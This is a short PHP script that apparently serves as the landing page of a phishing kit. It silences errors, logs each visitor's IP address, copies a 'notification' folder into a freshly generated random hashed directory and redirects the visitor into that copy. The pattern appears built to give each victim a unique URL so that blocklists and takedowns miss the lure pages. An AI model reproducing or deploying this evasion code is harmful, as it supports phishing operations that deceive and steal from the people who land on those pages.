<?
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
date_default_timezone_set('GMT');
$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('log.txt', $line . PHP_EOL, FILE_APPEND);
$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
function recurse_copy($src,$dst) { 
$dir = opendir($src); 
@mkdir($dst); 
while(false !== ( $file = readdir($dir)) ) { 
if (( $file != '.' ) && ( $file != '..' )) { 
if ( is_dir($src . '/' . $file) ) { 
recurse_copy($src . '/' . $file,$dst . '/' . $file); 
} 
else { 
copy($src . '/' . $file,$dst . '/' . $file); 
} 
} 
} 
closedir($dir); 
} 
$src="notification";
recurse_copy( $src, $dst );
header("location:$dst");
?>